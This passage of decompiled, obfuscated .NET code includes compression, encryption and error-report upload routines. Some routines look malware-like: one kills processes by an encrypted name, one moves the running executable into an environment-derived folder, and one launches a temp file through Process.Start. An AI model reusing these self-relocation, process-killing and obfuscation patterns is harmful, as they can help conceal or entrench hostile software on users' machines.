	internal static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static void smethod_68(Class33.Class36 class36_0)
	{
		int num = 0;
		class36_0.int_0 = 0;
		class36_0.int_1 = 0;
	}

	static void smethod_69(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static void smethod_70(bool bool_0, Control3 control3_0)
	{
		control3_0.timer_0.set_Enabled(bool_0);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	static int smethod_71(Class33.Stream0 stream0_0)
	{
		return Class12.smethod_162(stream0_0) | (Class12.smethod_162(stream0_0) << 16);
	}

	static Icon smethod_72()
	{
		int int_;
		int int_2 = default(int);
		int num = default(int);
		while (true)
		{
			int_ = 0;
			if (eDGT3VIwkRhN3e5ONQ())
			{
				switch (2)
				{
				case 0:
				case 3:
					break;
				case 1:
				case 2:
					int_2 = 0;
					num = ExtractIconEx(Application.get_ExecutablePath(), -1, ref int_2, ref int_2, 1);
					goto case 4;
				case 4:
					if (num > 0)
					{
						ExtractIconEx(Application.get_ExecutablePath(), 0, ref int_, ref int_2, 1);
						goto IL_005d;
					}
					goto IL_0060;
				default:
					goto IL_005d;
				case 6:
					goto end_IL_0001;
				}
				continue;
			}
			goto IL_005d;
			IL_0060:
			return null;
			IL_005d:
			if (int_ != 0)
			{
				break;
			}
			goto IL_0060;
			continue;
			end_IL_0001:
			break;
		}
		return Icon.FromHandle(new IntPtr(int_));
	}

	static void smethod_73(Class46 class46_0, Enum4 enum4_0, string string_0)
	{
		Class12.smethod_42(class46_0, enum4_0, string_0, string.Empty);
	}

	static bool smethod_74(bool bool_0, bool bool_1, Class33.Class42 class42_0)
	{
		bool flag2 = default(bool);
		do
		{
			Class12.smethod_59(class42_0);
			int num;
			if (!bool_0)
			{
				num = 0;
				goto IL_000a;
			}
			if (HOU2tiJgKu5JybMaDZ())
			{
				goto IL_0050;
			}
			switch (3)
			{
			case 0:
			case 3:
				goto IL_0050;
			case 4:
				goto end_IL_0000;
			}
			continue;
			IL_0050:
			num = ((class42_0.int_7 == class42_0.int_8) ? 1 : 0);
			goto IL_000a;
			IL_000a:
			bool flag = (byte)num != 0;
			flag2 = Class12.smethod_43((byte)num != 0, class42_0, bool_1);
			continue;
			end_IL_0000:
			break;
		}
		while (class42_0.class43_0.IsFlushed && flag2);
		return flag2;
	}

	static void smethod_75()
	{
		string text = Class32.smethod_0(1013);
	}

	static bool smethod_76(Class33.Class34 class34_0)
	{
		int num = Class12.smethod_64(class34_0.class36_0);
		while (num >= 258)
		{
			switch (class34_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class12.smethod_29(class34_0.class37_0, class34_0.class35_0)) & -256) == 0)
				{
					Class12.smethod_19(class34_0.class36_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class34_0.int_6 = Class33.Class34.int_0[num2 - 257];
					class34_0.int_5 = Class33.Class34.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class34_0.class37_1 = null;
				class34_0.class37_0 = null;
				class34_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class34_0.int_5 > 0)
				{
					class34_0.int_4 = 8;
					int num4 = Class12.smethod_133(class34_0.class35_0, class34_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class12.smethod_30(class34_0.class35_0, class34_0.int_5);
					class34_0.int_6 += num4;
				}
				class34_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class12.smethod_29(class34_0.class37_1, class34_0.class35_0);
				if (num2 >= 0)
				{
					class34_0.int_7 = Class33.Class34.int_2[num2];
					class34_0.int_5 = Class33.Class34.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class34_0.int_5 > 0)
				{
					class34_0.int_4 = 10;
					int num3 = Class12.smethod_133(class34_0.class35_0, class34_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class12.smethod_30(class34_0.class35_0, class34_0.int_5);
					class34_0.int_7 += num3;
				}
				Class12.smethod_39(class34_0.class36_0, class34_0.int_6, class34_0.int_7);
				num -= class34_0.int_6;
				class34_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static Assembly smethod_77()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static void smethod_78(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class12.smethod_138(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static void smethod_79(int int_0, int int_1, Class33.Class40 class40_0, bool bool_0, byte[] byte_0)
	{
		Class12.smethod_144(class40_0.class43_0, bool_0 ? 1 : 0, 3);
		Class12.smethod_90(class40_0.class43_0);
		Class12.smethod_130(int_0, class40_0.class43_0);
		Class12.smethod_130(~int_0, class40_0.class43_0);
		Class12.smethod_108(int_1, class40_0.class43_0, int_0, byte_0);
		Class12.smethod_97(class40_0);
	}

	static int smethod_80(Class33.Class36 class36_0)
	{
		return class36_0.int_1;
	}

	static byte[] smethod_81(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class12.smethod_18(byte_0, byte_2, 3, byte_1);
	}

	static Class33.Class37 smethod_82(Class33.Class38 class38_0)
	{
		byte[] array = new byte[class38_0.int_3];
		Array.Copy(class38_0.byte_1, 0, array, 0, class38_0.int_3);
		return new Class33.Class37(array);
	}

	static void smethod_83(string string_0, string string_1, EventArgs1 eventArgs1_0)
	{
		Class12.smethod_16(string_0, eventArgs1_0.class47_0, string_1);
	}

	static void smethod_84(Class47 class47_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class12.smethod_46(class47_0, tempFileName);
			string path = Class12.smethod_7();
			Process.Start(Path.Combine(path, Class32.smethod_0(3308)), Class32.smethod_0(3333) + tempFileName + Class32.smethod_0(1374));
			if (class47_0.eventHandler_0 != null)
			{
				class47_0.eventHandler_0(class47_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception fatalException)
		{
			Class12.smethod_147(new EventArgs0(fatalException), class47_0);
		}
	}

	static ICryptoTransform smethod_85(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static string smethod_86(string string_0)
	{
		string password = Class32.smethod_0(3362);
		Rfc2898DeriveBytes rfc2898DeriveBytes = default(Rfc2898DeriveBytes);
		byte[] bytes3 = default(byte[]);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		MemoryStream memoryStream = default(MemoryStream);
		CryptoStream cryptoStream = default(CryptoStream);
		string result = default(string);
		while (true)
		{
			string s = Class32.smethod_0(3367);
			string text = Class32.smethod_0(3396);
			int iterations = 2;
			string s2 = Class32.smethod_0(3405);
			int num = 256;
			byte[] bytes = Encoding.ASCII.GetBytes(s2);
			byte[] bytes2 = Encoding.ASCII.GetBytes(s);
			while (true)
			{
				byte[] array = Convert.FromBase64String(string_0);
				int num2 = 1;
				if (!HOU2tiJgKu5JybMaDZ())
				{
				}
				while (true)
				{
					switch (num2)
					{
					case 1:
					case 2:
						rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes2, iterations);
						goto case 0;
					case 0:
						bytes3 = rfc2898DeriveBytes.GetBytes(num / 8);
						rijndaelManaged = new RijndaelManaged();
						rijndaelManaged.Mode = CipherMode.CBC;
						num2 = 5;
						if (eDGT3VIwkRhN3e5ONQ())
						{
							continue;
						}
						goto case 4;
					default:
						num2 = 0;
						if (eDGT3VIwkRhN3e5ONQ())
						{
							continue;
						}
						goto end_IL_0080;
					case 6:
						break;
					case 7:
						goto end_IL_0080;
					case 4:
					case 5:
					{
						ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes3, bytes);
						memoryStream = new MemoryStream(array);
						cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
						goto case 3;
					}
					case 3:
					{
						byte[] array2 = new byte[checked(array.Length - 1 + 1)];
						int count = cryptoStream.Read(array2, 0, array2.Length);
						memoryStream.Close();
						cryptoStream.Close();
						return Encoding.UTF8.GetString(array2, 0, count);
					}
					case 8:
						return result;
					}
					break;
				}
				continue;
				end_IL_0080:
				break;
			}
		}
	}

	static byte[] smethod_87(string string_0, byte[] byte_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			int num4 = default(int);
			while (true)
			{
				int num = byte_0[byte_0.Length - 1] ^ 0x70;
				while (true)
				{
					byte[] bytes = Encoding.Default.GetBytes(string_0);
					int num2 = byte_0.Length - 1;
					int num3 = 0;
					while (true)
					{
						if (num3 <= num2)
						{
							array[num3] = (byte)(byte_0[num3] ^ num ^ bytes[num4]);
							num4 = ((num4 != string_0.Length - 1) ? (num4 + 1) : 0);
							goto IL_0031;
						}
						while (true)
						{
							array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
							if (!eDGT3VIwkRhN3e5ONQ())
							{
								break;
							}
							switch (6)
							{
							case 3:
								continue;
							case 0:
							case 1:
								goto end_IL_0037;
							case 4:
								goto end_IL_008b;
							case 6:
								return array;
							}
							goto IL_0031;
							continue;
							end_IL_0037:
							break;
						}
						break;
						IL_0031:
						num3++;
					}
					continue;
					end_IL_008b:
					break;
				}
			}
		}
	}

	static void smethod_88(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_1 = false;
	}

	static object smethod_89(Class51 class51_0)
	{
		return class51_0.object_0;
	}

	[DllImport("kernel32.Dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	static void smethod_90(Class33.Class43 class43_0)
	{
		if (class43_0.int_2 > 0)
		{
			class43_0.byte_0[class43_0.int_1++] = (byte)class43_0.uint_0;
			if (class43_0.int_2 > 8)
			{
				class43_0.byte_0[class43_0.int_1++] = (byte)(class43_0.uint_0 >> 8);
			}
		}
		class43_0.uint_0 = 0u;
		class43_0.int_2 = 0;
	}

	static Bitmap smethod_91(string string_0)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Class32.smethod_0(3238) + string_0 + Class32.smethod_0(3430));
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_92(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class12.smethod_91(Class32.smethod_0(3439));
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool DeleteFile(string string_0);

	static Exception smethod_93(object[] object_0, Exception exception_0)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == Class32.smethod_0(2428))
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class12.smethod_138(exception_0, object_0);
			}
			Class56.Handler.method_3(exception_0, bool_1: true, bool_2: false);
		}
		catch
		{
		}
		return (Exception)new SoapException(exception_0.Message, SoapException.ServerFaultCode);
	}

	static void smethod_94(Class47 class47_0)
	{
		EventHandler eventHandler_ = default(EventHandler);
		if (eDGT3VIwkRhN3e5ONQ())
		{
			switch (4)
			{
			case 0:
			case 4:
				eventHandler_ = class47_0.eventHandler_0;
				break;
			case 3:
				break;
			default:
				goto IL_0038;
			case 5:
				return;
			}
		}
		if (eventHandler_ == null)
		{
			return;
		}
		goto IL_0038;
		IL_0038:
		eventHandler_(class47_0, EventArgs.Empty);
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_12([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_95()
	{
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName(Class32.smethod_0(3452));
		if (processesByName.Length <= 0)
		{
			return;
		}
		checked
		{
			int num = processesByName.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!processesByName[i].HasExited && (double)processesByName[i].WorkingSet64 / 1024.0 < 130.0)
				{
					try
					{
						processesByName[i].Kill();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						MessageBox.Show(ex2.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	static void smethod_96(Class33.Class40.Class41 class41_0)
	{
		int[] array = new int[class41_0.int_3];
		int num5 = default(int);
		while (true)
		{
			int num = 0;
			class41_0.short_1 = new short[class41_0.short_0.Length];
			int num2 = 0;
			while (true)
			{
				if (num2 < class41_0.int_3)
				{
					array[num2] = num;
					goto IL_0016;
				}
				int num3 = 0;
				int num4 = 2;
				if (HOU2tiJgKu5JybMaDZ())
				{
					goto IL_0073;
				}
				goto IL_00a5;
				IL_0060:
				num3++;
				num4 = 7;
				if (!eDGT3VIwkRhN3e5ONQ())
				{
					goto IL_0047;
				}
				goto IL_00a5;
				IL_00a5:
				switch (num4)
				{
				case 0:
				case 1:
					break;
				case 2:
				case 7:
					goto IL_0047;
				case 4:
				case 5:
					goto IL_0060;
				default:
					goto IL_0073;
				case 6:
					goto end_IL_00cc;
				}
				goto IL_0016;
				IL_0047:
				if (num3 < class41_0.int_1)
				{
					num5 = class41_0.byte_0[num3];
					if (num5 <= 0)
					{
						goto IL_0060;
					}
					goto IL_0073;
				}
				return;
				IL_0016:
				num += class41_0.int_2[num2] << 15 - num2;
				num2++;
				continue;
				IL_0073:
				class41_0.short_1[num3] = Class12.smethod_136(array[num5 - 1]);
				array[num5 - 1] += 1 << 16 - num5;
				goto IL_0060;
				continue;
				end_IL_00cc:
				break;
			}
		}
	}

	static void smethod_97(Class33.Class40 class40_0)
	{
		class40_0.int_1 = 0;
		class40_0.int_2 = 0;
	}

	static void smethod_98()
	{
		string text = Class32.smethod_0(1013);
	}

	static ICryptoTransform smethod_99(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_0, byte_1) : dESCryptoServiceProvider.CreateEncryptor(byte_0, byte_1);
	}

	static bool smethod_100(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		if (!HOU2tiJgKu5JybMaDZ())
		{
			byte[] publicKey2 = default(byte[]);
			switch (5)
			{
			case 5:
				publicKey2 = assembly_0.GetName().GetPublicKey();
				if (publicKey2 == null != (publicKey == null))
				{
					return false;
				}
				if (publicKey2 != null)
				{
					goto default;
				}
				goto case 6;
			default:
			{
				for (int i = 0; i < publicKey2.Length; i++)
				{
					if (publicKey2[i] != publicKey[i])
					{
						return false;
					}
				}
				goto case 6;
			}
			case 6:
				return true;
			case 1:
			case 3:
			case 4:
				break;
			}
		}
		bool result = default(bool);
		return result;
	}

	static bool smethod_101(byte[] byte_0, Class46.Class50 class50_0, Class46 class46_0)
	{
		Class58 @class = default(Class58);
		Class46.Class48 class2 = default(Class46.Class48);
		while (true)
		{
			byte[] byte_;
			try
			{
				byte_ = Class12.smethod_58(byte_0);
			}
			catch (Exception)
			{
				Class12.smethod_73(class46_0, Enum4.const_0, Class33.string_0);
				return false;
			}
			byte[] array = Class12.smethod_112(byte_, Class32.smethod_0(2474));
			while (true)
			{
				if (array == null)
				{
					if (!HOU2tiJgKu5JybMaDZ())
					{
						switch (3)
						{
						case 0:
							break;
						case 1:
						case 5:
							continue;
						case 2:
						case 3:
							Class12.smethod_73(class46_0, Enum4.const_0, Class45.string_0);
							goto IL_0079;
						default:
							goto IL_0079;
						case 4:
							goto IL_00b0;
						case 7:
							goto IL_00c2;
						}
						break;
					}
					goto IL_0079;
				}
				Class12.smethod_45(class46_0, Enum4.const_1);
				@class = new Class58(Class32.smethod_0(3489));
				if (class46_0.iwebProxy_0 != null)
				{
					@class.iwebProxy_0 = class46_0.iwebProxy_0;
				}
				class2 = new Class46.Class48(class46_0, array, @class, class50_0);
				goto IL_00b0;
				IL_00c2:
				return class2.bool_0;
				IL_00b0:
				Class12.smethod_13((Delegate21)class2.method_0, @class);
				goto IL_00c2;
				IL_0079:
				return false;
			}
		}
	}

	static void smethod_102()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		object executablePath = default(object);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 356:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0034;
						case 4:
							goto IL_0074;
						case 5:
							goto IL_007d;
						case 6:
							goto IL_0082;
						case 7:
							goto IL_00bc;
						case 8:
						case 9:
							goto IL_00c1;
						case 12:
							goto IL_00cd;
						case 13:
							goto IL_00d1;
						case 14:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
						case 15:
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00d1:
					num = 13;
					File.Delete(text + Class32.smethod_0(3538));
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1108));
					goto IL_0034;
					IL_0034:
					num = 3;
					text = Class32.smethod_0(1013) + Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1047)) + Class32.smethod_0(1013);
					goto IL_0074;
					IL_0074:
					num = 4;
					executablePath = Application.get_ExecutablePath();
					goto IL_007d;
					IL_007d:
					num = 5;
					flag = false;
					goto IL_0082;
					IL_0082:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual(executablePath, (object)(text + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258))), false))
					{
						goto IL_00bc;
					}
					goto IL_00c1;
					IL_00bc:
					num = 7;
					flag = true;
					goto IL_00c1;
					IL_00c1:
					num = 9;
					if (flag)
					{
						goto end_IL_0000_3;
					}
					goto IL_00cd;
					IL_00cd:
					num = 12;
					goto IL_00d1;
					end_IL_0000_2:
					break;
				}
				num = 14;
				File.Move(Application.get_ExecutablePath(), text + Class32.smethod_0(3538));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 356;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_103(Class33.Class42 class42_0)
	{
		return class42_0.int_8 == class42_0.int_7;
	}

	static void smethod_104(Class33.Class37 class37_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int num2 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		while (true)
		{
			int[] array2 = new int[16];
			int num = 0;
			while (true)
			{
				if (num < byte_0.Length)
				{
					num2 = byte_0[num];
					if (num2 <= 0)
					{
						goto IL_002d;
					}
				}
				else
				{
					while (true)
					{
						IL_024e:
						int num3 = 0;
						int num4 = 512;
						while (true)
						{
							IL_0249:
							int num5 = 1;
							while (true)
							{
								if (num5 <= 15)
								{
									array2[num5] = num3;
									num3 += array[num5] << 16 - num5;
									if (num5 < 10)
									{
										goto IL_0081;
									}
									num6 = array2[num5] & 0x1FF80;
									num7 = num3 & 0x1FF80;
									goto IL_006e;
								}
								class37_0.short_0 = new short[num4];
								int num8 = 512;
								int num9 = 15;
								while (true)
								{
									IL_022d:
									if (num9 >= 10)
									{
										int num10 = num3 & 0x1FF80;
										num3 -= array[num9] << 16 - num9;
										int num11 = num3 & 0x1FF80;
										for (int i = num11; i < num10; i += 128)
										{
											class37_0.short_0[Class12.smethod_136(i)] = (short)((-num8 << 4) | num9);
											num8 += 1 << num9 - 9;
										}
										num9--;
										continue;
									}
									int num12 = 0;
									while (true)
									{
										IL_0221:
										if (num12 >= byte_0.Length)
										{
											return;
										}
										int num13 = byte_0[num12];
										if (num13 != 0)
										{
											num3 = array2[num13];
											int num14 = Class12.smethod_136(num3);
											while (true)
											{
												IL_01bf:
												if (num13 <= 9)
												{
													do
													{
														class37_0.short_0[num14] = (short)((num12 << 4) | num13);
														num14 += 1 << num13;
													}
													while (num14 < 512);
													int num15 = 4;
													if (!HOU2tiJgKu5JybMaDZ())
													{
													}
													while (true)
													{
														switch (num15)
														{
														case 10:
															break;
														case 13:
															goto IL_002d;
														case 2:
														case 5:
															goto IL_006e;
														default:
															num15 = 9;
															if (eDGT3VIwkRhN3e5ONQ())
															{
																continue;
															}
															goto IL_01bf;
														case 11:
															goto IL_01bf;
														case 4:
															goto IL_0209;
														case 12:
															goto IL_021b;
														case 1:
														case 8:
														case 14:
															goto IL_0221;
														case 6:
														case 9:
															goto IL_022d;
														case 3:
															goto IL_0249;
														case 7:
															goto IL_024e;
														case 0:
															goto end_IL_025a;
														}
														break;
													}
													break;
												}
												int num16 = class37_0.short_0[num14 & 0x1FF];
												int num17 = 1 << (num16 & 0xF);
												num16 = -(num16 >> 4);
												do
												{
													class37_0.short_0[num16 | (num14 >> 9)] = (short)((num12 << 4) | num13);
													num14 += 1 << num13;
												}
												while (num14 < num17);
												goto IL_0209;
												IL_0209:
												array2[num13] = num3 + (1 << 16 - num13);
												goto IL_021b;
											}
											break;
										}
										goto IL_021b;
										IL_021b:
										num12++;
									}
									break;
								}
								break;
								IL_0081:
								num5++;
								continue;
								IL_006e:
								num4 += num7 - num6 >> 16 - num5;
								goto IL_0081;
							}
							break;
						}
						break;
					}
				}
				array[num2]++;
				goto IL_002d;
				IL_002d:
				num++;
				continue;
				end_IL_025a:
				break;
			}
		}
	}

	static int smethod_105(string string_0, Class47 class47_0)
	{
		try
		{
			bool flag = class47_0.char_0[0] == '\u0001';
			int num = default(int);
			int num3 = default(int);
			while (string_0 != null)
			{
				if (eDGT3VIwkRhN3e5ONQ())
				{
					switch (8)
					{
					case 6:
						break;
					case 8:
						goto IL_0052;
					case 1:
						goto IL_0060;
					case 3:
					case 7:
						goto IL_0069;
					default:
						goto IL_007c;
					case 0:
						goto IL_008f;
					case 2:
						goto IL_00cd;
					case 9:
						goto IL_00e3;
					}
					continue;
				}
				goto IL_0052;
				IL_00be:
				int num2;
				num = num * class47_0.char_0.Length + num2;
				goto IL_00cd;
				IL_00cd:
				bool flag2 = true;
				goto IL_00cf;
				IL_0052:
				if (string_0.Length == 0)
				{
					break;
				}
				if (flag)
				{
					goto IL_0060;
				}
				goto IL_0069;
				IL_00e3:
				return num;
				IL_0060:
				if (string_0.Length > 4)
				{
					break;
				}
				goto IL_0069;
				IL_0069:
				if (!flag && string_0[0] != '#')
				{
					break;
				}
				num = 0;
				goto IL_007c;
				IL_00cf:
				if (flag2)
				{
					num3--;
					goto IL_00d8;
				}
				return -1;
				IL_008f:
				char c = string_0[num3];
				flag2 = false;
				for (num2 = 0; num2 < class47_0.char_0.Length; num2++)
				{
					if (class47_0.char_0[num2] == c)
					{
						goto IL_00be;
					}
				}
				goto IL_00cf;
				IL_007c:
				num3 = string_0.Length - 1;
				goto IL_00d8;
				IL_00d8:
				if (num3 >= 0 && (flag || num3 != 0))
				{
					goto IL_008f;
				}
				goto IL_00e3;
			}
			return -1;
		}
		catch
		{
			return -1;
		}
	}

	static void smethod_106(Delegate21 delegate21_0, string string_0, Class58 class58_0, byte[] byte_0, string string_1, string string_2)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class58_0.string_2);
			if (class58_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class58_0.iwebProxy_0);
			}
			delegate21_0(reportingService.UploadReport2(class58_0.string_1, byte_0, string_0, string_2, string_1));
		}
		catch (Exception ex)
		{
			delegate21_0(Class32.smethod_0(3551) + ex.Message);
		}
	}

	static bool smethod_107(int int_0, int int_1, Class33.Class40 class40_0)
	{
		class40_0.short_0[class40_0.int_1] = (short)int_0;
		class40_0.byte_1[class40_0.int_1++] = (byte)(int_1 - 3);
		int num = Class12.smethod_0(class40_0, int_1 - 3);
		class40_0.class41_0.short_0[num]++;
		if (num >= 265 && num < 285)
		{
			class40_0.int_2 += (num - 261) / 4;
		}
		int num2 = Class12.smethod_67(class40_0, int_0 - 1);
		class40_0.class41_1.short_0[num2]++;
		if (num2 >= 4)
		{
			class40_0.int_2 += num2 / 2 - 1;
		}
		return Class12.smethod_113(class40_0);
	}

	static void smethod_108(int int_0, Class33.Class43 class43_0, int int_1, byte[] byte_0)
	{
		Array.Copy(byte_0, int_0, class43_0.byte_0, class43_0.int_1, int_1);
		class43_0.int_1 += int_1;
	}

	static IntPtr smethod_109(string string_0)
	{
		IEnumerator enumerator = default(IEnumerator);
		IntPtr baseAddress;
		try
		{
			enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
			while (enumerator.MoveNext())
			{
				ProcessModule processModule = (ProcessModule)enumerator.Current;
				if (!processModule.ModuleName!.ToLower().StartsWith(string_0))
				{
					continue;
				}
				baseAddress = processModule.BaseAddress;
				goto IL_0060;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return IntPtr.Zero;
		IL_0060:
		return baseAddress;
	}

	static int smethod_110(string string_0, int int_0, Graphics graphics_0, Font font_0)
	{
		Class59.Struct23 struct23_ = default(Class59.Struct23);
		IntPtr hdc = default(IntPtr);
		IntPtr intptr_2 = default(IntPtr);
		if (!HOU2tiJgKu5JybMaDZ())
		{
			switch (4)
			{
			case 4:
				struct23_ = new Class59.Struct23(new Rectangle(0, 0, int_0, 10000));
				goto case 1;
			case 1:
			{
				hdc = graphics_0.GetHdc();
				IntPtr intptr_ = font_0.ToHfont();
				intptr_2 = SelectObject(hdc, intptr_);
				DrawText(hdc, string_0, -1, ref struct23_, 3088);
				break;
			}
			case 2:
			case 5:
				break;
			default:
				goto IL_0079;
			case 6:
				goto IL_0080;
			}
		}
		SelectObject(hdc, intptr_2);
		goto IL_0079;
		IL_0079:
		graphics_0.ReleaseHdc(hdc);
		goto IL_0080;
		IL_0080:
		return struct23_.int_3 - struct23_.int_1;
	}

	static int smethod_111(Class33.Class35 class35_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		int result = default(int);
		while (true)
		{
			IL_00f5:
			if (class35_0.int_2 <= 0 || int_1 <= 0)
			{
				if (int_1 == 0)
				{
					return num;
				}
				int num2 = class35_0.int_1 - class35_0.int_0;
				if (int_1 > num2)
				{
					int_1 = num2;
				}
				Array.Copy(class35_0.byte_0, class35_0.int_0, byte_0, int_0, int_1);
				class35_0.int_0 += int_1;
				if (((class35_0.int_0 - class35_0.int_1) & 1) == 0)
				{
					break;
				}
				while (true)
				{
					class35_0.uint_0 = class35_0.byte_0[class35_0.int_0++] & 0xFFu;
					class35_0.int_2 = 8;
					if (HOU2tiJgKu5JybMaDZ())
					{
					}
					switch (7)
					{
					case 6:
						continue;
					case 0:
					case 2:
						goto end_IL_0058;
					case 1:
					case 3:
						goto IL_00d7;
					case 4:
						goto IL_00f5;
					case 7:
						goto end_IL_00f5;
					}
					return result;
					continue;
					end_IL_0058:
					break;
				}
			}
			else
			{
				byte_0[int_0++] = (byte)class35_0.uint_0;
			}
			class35_0.uint_0 >>= 8;
			class35_0.int_2 -= 8;
			int_1--;
			goto IL_00d7;
			IL_00d7:
			num++;
			continue;
			end_IL_00f5:
			break;
		}
		return num + int_1;
	}

	static byte[] smethod_112(byte[] byte_0, string string_0)
	{
		if (eDGT3VIwkRhN3e5ONQ())
		{
			RijndaelManaged rijndaelManaged = default(RijndaelManaged);
			RSACryptoServiceProvider rSACryptoServiceProvider = default(RSACryptoServiceProvider);
			MemoryStream memoryStream = default(MemoryStream);
			CryptoStream cryptoStream = default(CryptoStream);
			switch (5)
			{
			case 5:
				if (string_0.StartsWith(Class32.smethod_0(3568)))
				{
					break;
				}
				rijndaelManaged = null;
				rSACryptoServiceProvider = null;
				goto case 4;
			case 1:
			case 2:
				break;
			case 4:
				memoryStream = null;
				goto default;
			default:
				cryptoStream = null;
				goto case 6;
			case 6:
				try
				{
					rijndaelManaged = new RijndaelManaged();
					rSACryptoServiceProvider = new RSACryptoServiceProvider();
					rSACryptoServiceProvider.FromXmlString(string_0);
					rijndaelManaged.GenerateKey();
					rijndaelManaged.GenerateIV();
					byte[] array = new byte[48];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
					Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
					memoryStream = new MemoryStream();
					try
					{
						byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
